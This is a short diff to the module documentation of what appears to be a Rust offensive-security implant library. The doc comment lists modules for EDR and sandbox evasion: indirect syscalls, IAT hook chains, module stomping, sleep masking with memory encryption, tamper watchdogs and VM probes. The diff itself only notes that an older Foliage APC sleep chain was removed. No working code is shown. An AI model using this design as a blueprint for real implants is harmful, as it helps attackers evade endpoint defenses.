@@ -20,7 +20,8 @@
 //! - [`hookchain`] — IAT hook-chain redirect onto indirect-syscall stubs.
 //! - [`lacuna`] / [`lacuna_stomp`] — ghost-region scan + module stomping.
 //! - [`sleep`] / [`fluctuation`] / [`fluctuation_thunk`] — sleep-mask family
-//!   (Foliage APC / .text page-flip / PIC thunk).
+//!   (floor sleep helpers / Fluctuation .text page-flip / PIC thunk). The
+//!   older Foliage APC chain was removed (commit 841ffc5).
 //! - [`mem`] — sleep-time memory encryption (RC4 over registered regions).
 //! - [`insomniac`] — .text tamper watchdog (detects AV/EDR byte patches).
 //! - [`envprobe`] — VM/sandbox environment probe suite.
